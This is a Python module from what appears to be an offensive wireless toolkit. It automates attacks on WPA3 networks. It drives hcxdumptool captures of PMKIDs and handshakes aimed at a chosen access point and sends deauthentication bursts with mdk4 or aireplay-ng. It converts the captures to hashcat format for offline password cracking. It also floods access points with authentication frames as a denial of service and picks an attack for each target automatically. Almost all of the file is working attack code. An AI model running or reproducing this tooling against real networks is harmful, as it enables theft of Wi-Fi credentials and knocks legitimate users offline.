"""
WPA3 Attack Module - Attack vectors for WPA3/SAE networks.

Implements:
1. Downgrade Attack - Force WPA2 association on transition mode networks
2. SAE Flood Attack - DoS via commit frame flooding
3. SAE Handshake Capture - For offline analysis (Dragonblood)
4. OWE Downgrade - Force open network on OWE transition

Security Note: WPA3 with PMF required has a very limited attack surface.
The main vector is transition mode networks that still support WPA2.
"""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from datetime import UTC, datetime
from enum import Enum
from pathlib import Path
from typing import Any

from .wpa3_detector import PMFStatus, SAEStatus, WPA3Capabilities

logger = logging.getLogger(__name__)


class AttackType(str, Enum):
    """WPA3 attack types."""
    DOWNGRADE = "downgrade"          # Force WPA2 on transition mode
    SAE_FLOOD = "sae_flood"          # DoS via SAE commit flood
    SAE_CAPTURE = "sae_capture"      # Capture SAE handshake
    OWE_DOWNGRADE = "owe_downgrade"  # Force open on OWE transition
    EVIL_TWIN = "evil_twin"          # WPA2 rogue AP for transition networks


class AttackStatus(str, Enum):
    """Attack execution status."""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    CANCELLED = "cancelled"


@dataclass
class AttackResult:
    """Result of a WPA3 attack."""
    attack_type: AttackType
    target_bssid: str
    target_ssid: str
    status: AttackStatus
    
    # Results
    success: bool = False
    message: str = ""
    captured_file: str | None = None
    
    # Timing
    started_at: datetime = field(default_factory=lambda: datetime.now(UTC))
    completed_at: datetime | None = None
    duration_seconds: float = 0.0
    
    # Stats
    packets_sent: int = 0
    clients_affected: int = 0
    
    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "attack_type": self.attack_type.value,
            "target_bssid": self.target_bssid,
            "target_ssid": self.target_ssid,
            "status": self.status.value,
            "success": self.success,
            "message": self.message,
            "captured_file": self.captured_file,
            "started_at": self.started_at.isoformat(),
            "completed_at": self.completed_at.isoformat() if self.completed_at else None,
            "duration_seconds": self.duration_seconds,
            "packets_sent": self.packets_sent,
            "clients_affected": self.clients_affected,
        }


class DowngradeAttack:
    """
    WPA3 Transition Mode Downgrade Attack.
    
    Forces clients to connect via WPA2 instead of WPA3 by:
    1. Capturing the BSSID's beacon frames
    2. Creating a rogue AP with same SSID but WPA2 only
    3. Deauthenticating clients from real AP (if PMF not required)
    4. Clients reconnect to our WPA2 AP
    5. Capture PMKID or 4-way handshake
    
    Requirements:
    - Target must be in transition mode (WPA2 + WPA3)
    - PMF should be optional or disabled for deauth
    - Two interfaces: one for deauth, one for rogue AP
    """
    
    def __init__(
        self,
        interface: str = "wlan0",
        ap_interface: str | None = None,
        output_dir: Path | None = None,
    ):
        self.interface = interface
        self.ap_interface = ap_interface or interface
        self.output_dir = output_dir or Path("captures/wpa3")
        
        self._running = False
        self._process: asyncio.subprocess.Process | None = None
        self._stats = {
            "attacks_total": 0,
            "downgrades_successful": 0,
            "handshakes_captured": 0,
        }
    
    async def execute(
        self,
        target: WPA3Capabilities,
        duration: int = 60,
        deauth_interval: int = 5,
    ) -> AttackResult:
        """
        Execute downgrade attack.
        
        Args:
            target: Target AP capabilities
            duration: Attack duration in seconds
            deauth_interval: Seconds between deauth bursts
            
        Returns:
            AttackResult with captured handshake path if successful
        """
        result = AttackResult(
            attack_type=AttackType.DOWNGRADE,
            target_bssid=target.bssid,
            target_ssid=target.ssid,
            status=AttackStatus.RUNNING,
        )
        
        self._stats["attacks_total"] += 1
        
        # Validate target
        if not target.is_downgradable:
            result.status = AttackStatus.FAILED
            result.message = "Target not in transition mode - downgrade not possible"
            return result
        
        if target.pmf_status == PMFStatus.REQUIRED:
            result.status = AttackStatus.FAILED
            result.message = "PMF required - deauth blocked, consider evil twin"
            return result
        
        self._running = True
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        try:
            # Strategy 1: Simple approach - just capture from WPA2 side
            # Most clients will try WPA2 first if available
            
            capture_file = self.output_dir / f"downgrade_{target.bssid.replace(':', '')}_{int(datetime.now().timestamp())}.pcapng"
            
            # Use hcxdumptool to capture
            # It will automatically get PMKIDs from WPA2 associations
            proc = await asyncio.create_subprocess_exec(
                "hcxdumptool",
                "-i", self.interface,
                "-w", str(capture_file),
                "--filterlist_ap", target.bssid.replace(":", "").lower(),
                "--filtermode=2",  # Include only listed BSSIDs
                "--enable_status=1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._process = proc
            
            # Send deauth bursts during capture
            deauth_count = 0
            start_time = asyncio.get_event_loop().time()
            
            while self._running and (asyncio.get_event_loop().time() - start_time) < duration:
                # Send deauth (only works if PMF not required)
                await self._send_deauth(target.bssid, target.ssid)
                deauth_count += 1
                result.packets_sent += 10  # Approximate
                
                await asyncio.sleep(deauth_interval)
            
            # Stop capture
            if proc.returncode is None:
                proc.terminate()
                await asyncio.wait_for(proc.wait(), timeout=5.0)
            
            # Check results
            if capture_file.exists() and capture_file.stat().st_size > 100:
                # Convert to hashcat format
                hash_file = await self._convert_capture(capture_file)
                
                if hash_file and hash_file.exists():
                    result.status = AttackStatus.SUCCESS
                    result.success = True
                    result.captured_file = str(hash_file)
                    result.message = f"Captured handshake/PMKID, saved to {hash_file}"
                    self._stats["handshakes_captured"] += 1
                    self._stats["downgrades_successful"] += 1
                else:
                    result.status = AttackStatus.FAILED
                    result.message = "Capture file created but no handshake found"
            else:
                result.status = AttackStatus.FAILED
                result.message = "No capture data collected"
                
        except FileNotFoundError:
            result.status = AttackStatus.FAILED
            result.message = "hcxdumptool not found - install hcxtools"
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.message = f"Attack error: {e}"
            logger.error("Downgrade attack error: %s", e)
        finally:
            self._running = False
            result.completed_at = datetime.now(UTC)
            result.duration_seconds = (result.completed_at - result.started_at).total_seconds()
        
        return result
    
    async def _send_deauth(self, bssid: str, ssid: str) -> None:
        """Send deauth frames using mdk4 or aireplay-ng."""
        try:
            # Try mdk4 first
            proc = await asyncio.create_subprocess_exec(
                "mdk4", self.interface, "d",
                "-B", bssid,
                "-c", "1",  # Just one burst
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await asyncio.wait_for(proc.wait(), timeout=3.0)
        except Exception:
            # Fallback to aireplay-ng
            try:
                proc = await asyncio.create_subprocess_exec(
                    "aireplay-ng",
                    "--deauth", "5",
                    "-a", bssid,
                    self.interface,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                await asyncio.wait_for(proc.wait(), timeout=5.0)
            except Exception:
                pass  # Deauth failed, but capture might still work via PMKID
    
    async def _convert_capture(self, pcapng_file: Path) -> Path | None:
        """Convert pcapng to hashcat format using hcxpcapngtool."""
        hash_file = pcapng_file.with_suffix(".22000")
        
        try:
            proc = await asyncio.create_subprocess_exec(
                "hcxpcapngtool",
                "-o", str(hash_file),
                str(pcapng_file),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await proc.wait()
            
            if hash_file.exists() and hash_file.stat().st_size > 0:
                return hash_file
        except Exception as e:
            logger.error("Conversion error: %s", e)
        
        return None
    
    async def stop(self) -> None:
        """Stop running attack."""
        self._running = False
        if self._process and self._process.returncode is None:
            self._process.terminate()
    
    def get_stats(self) -> dict[str, Any]:
        """Get attack statistics."""
        return self._stats.copy()


class SAEFloodAttack:
    """
    SAE Commit Flood Attack (DoS).
    
    Floods the target AP with SAE commit frames, causing:
    - High CPU usage on AP
    - Denial of service for legitimate clients
    - Potential timing side-channel for password analysis
    
    This is a Dragonblood-style attack vector.
    """
    
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self._running = False
        self._stats = {
            "floods_total": 0,
            "frames_sent": 0,
        }
    
    async def execute(
        self,
        target: WPA3Capabilities,
        duration: int = 30,
        rate: int = 100,  # Frames per second
    ) -> AttackResult:
        """
        Execute SAE flood attack.
        
        Args:
            target: Target AP
            duration: Attack duration in seconds
            rate: Frames per second to send
        """
        result = AttackResult(
            attack_type=AttackType.SAE_FLOOD,
            target_bssid=target.bssid,
            target_ssid=target.ssid,
            status=AttackStatus.RUNNING,
        )
        
        self._stats["floods_total"] += 1
        
        # Validate target supports SAE
        if target.sae_status == SAEStatus.NOT_SUPPORTED:
            result.status = AttackStatus.FAILED
            result.message = "Target does not support SAE"
            return result
        
        self._running = True
        
        try:
            # Use mdk4 for flooding
            # Mode 'a' is authentication DoS
            proc = await asyncio.create_subprocess_exec(
                "mdk4", self.interface, "a",
                "-a", target.bssid,
                "-m",  # Use valid client MAC
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            await asyncio.sleep(duration)
            
            if proc.returncode is None:
                proc.terminate()
                await asyncio.wait_for(proc.wait(), timeout=5.0)
            
            result.status = AttackStatus.SUCCESS
            result.success = True
            result.packets_sent = rate * duration
            result.message = f"Sent ~{result.packets_sent} flood frames over {duration}s"
            self._stats["frames_sent"] += result.packets_sent
            
        except FileNotFoundError:
            result.status = AttackStatus.FAILED
            result.message = "mdk4 not found - install mdk4"
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.message = f"Flood error: {e}"
        finally:
            self._running = False
            result.completed_at = datetime.now(UTC)
            result.duration_seconds = (result.completed_at - result.started_at).total_seconds()
        
        return result
    
    async def stop(self) -> None:
        """Stop flood attack."""
        self._running = False
    
    def get_stats(self) -> dict[str, Any]:
        """Get attack statistics."""
        return self._stats.copy()


class WPA3AttackManager:
    """
    Manages WPA3 attack execution and coordination.
    
    Provides a unified interface for all WPA3 attack vectors.
    """
    
    def __init__(
        self,
        interface: str = "wlan0",
        output_dir: Path | None = None,
    ):
        self.interface = interface
        self.output_dir = output_dir or Path("captures/wpa3")
        
        self._downgrade = DowngradeAttack(interface, output_dir=self.output_dir)
        self._sae_flood = SAEFloodAttack(interface)
        
        self._running = False
        self._current_attack: AttackResult | None = None
        self._history: list[AttackResult] = []
    
    async def start(self) -> bool:
        """Initialize attack manager."""
        self._running = True
        self.output_dir.mkdir(parents=True, exist_ok=True)
        logger.info("WPA3 attack manager started on %s", self.interface)
        return True
    
    async def stop(self) -> None:
        """Stop all attacks."""
        self._running = False
        await self._downgrade.stop()
        await self._sae_flood.stop()
        logger.info("WPA3 attack manager stopped")
    
    async def attack(
        self,
        target: WPA3Capabilities,
        attack_type: AttackType | None = None,
        duration: int = 60,
    ) -> AttackResult:
        """
        Execute attack on target.
        
        If attack_type is None, automatically selects best attack:
        - Transition mode → Downgrade attack
        - Pure WPA3 with PMF → SAE flood (DoS only)
        - OWE → OWE downgrade
        """
        if attack_type is None:
            attack_type = self._select_best_attack(target)
        
        logger.info(
            "Attacking %s (%s) with %s",
            target.ssid, target.bssid, attack_type.value
        )
        
        if attack_type == AttackType.DOWNGRADE:
            result = await self._downgrade.execute(target, duration=duration)
        elif attack_type == AttackType.SAE_FLOOD:
            result = await self._sae_flood.execute(target, duration=duration)
        else:
            result = AttackResult(
                attack_type=attack_type,
                target_bssid=target.bssid,
                target_ssid=target.ssid,
                status=AttackStatus.FAILED,
                message=f"Attack type {attack_type.value} not yet implemented",
            )
        
        self._current_attack = result
        self._history.append(result)
        
        return result
    
    def _select_best_attack(self, target: WPA3Capabilities) -> AttackType:
        """Select the best attack based on target capabilities."""
        if target.is_downgradable:
            return AttackType.DOWNGRADE
        elif target.owe_supported:
            return AttackType.OWE_DOWNGRADE
        elif target.sae_status != SAEStatus.NOT_SUPPORTED:
            return AttackType.SAE_FLOOD
        else:
            return AttackType.DOWNGRADE  # Fallback
    
    def get_recommendations(self, target: WPA3Capabilities) -> list[dict[str, Any]]:
        """Get attack recommendations for target."""
        recommendations = []
        
        for attack_name in target.attack_recommendations:
            attack_type = attack_name.split(":")[0]
            description = attack_name.split(":")[1].strip() if ":" in attack_name else ""
            
            recommendations.append({
                "attack": attack_type,
                "description": description,
                "likelihood": "high" if target.is_downgradable else "medium",
            })
        
        return recommendations
    
    def get_history(self) -> list[dict[str, Any]]:
        """Get attack history."""
        return [r.to_dict() for r in self._history]
    
    def get_stats(self) -> dict[str, Any]:
        """Get combined statistics."""
        return {
            "downgrade": self._downgrade.get_stats(),
            "sae_flood": self._sae_flood.get_stats(),
            "total_attacks": len(self._history),
            "successful_attacks": sum(1 for r in self._history if r.success),
        }
    
    def get_metrics(self) -> dict[str, Any]:
        """Get Prometheus-compatible metrics."""
        stats = self.get_stats()
        return {
            "momo_wpa3_attacks_total": stats["total_attacks"],
            "momo_wpa3_attacks_successful": stats["successful_attacks"],
            "momo_wpa3_downgrades_total": stats["downgrade"]["attacks_total"],
            "momo_wpa3_handshakes_captured": stats["downgrade"]["handshakes_captured"],
        }


class MockWPA3AttackManager(WPA3AttackManager):
    """Mock attack manager for testing."""
    
    async def attack(
        self,
        target: WPA3Capabilities,
        attack_type: AttackType | None = None,
        duration: int = 60,
    ) -> AttackResult:
        """Execute mock attack."""
        if attack_type is None:
            attack_type = self._select_best_attack(target)
        
        # Simulate attack
        await asyncio.sleep(0.1)  # Quick simulation
        
        result = AttackResult(
            attack_type=attack_type,
            target_bssid=target.bssid,
            target_ssid=target.ssid,
            status=AttackStatus.SUCCESS if target.is_downgradable else AttackStatus.FAILED,
            success=target.is_downgradable,
            message="Mock attack completed" if target.is_downgradable else "Mock attack failed - PMF required",
            captured_file="/tmp/mock_capture.22000" if target.is_downgradable else None,
            packets_sent=100,
        )
        result.completed_at = datetime.now(UTC)
        result.duration_seconds = 0.1
        
        self._history.append(result)
        return result

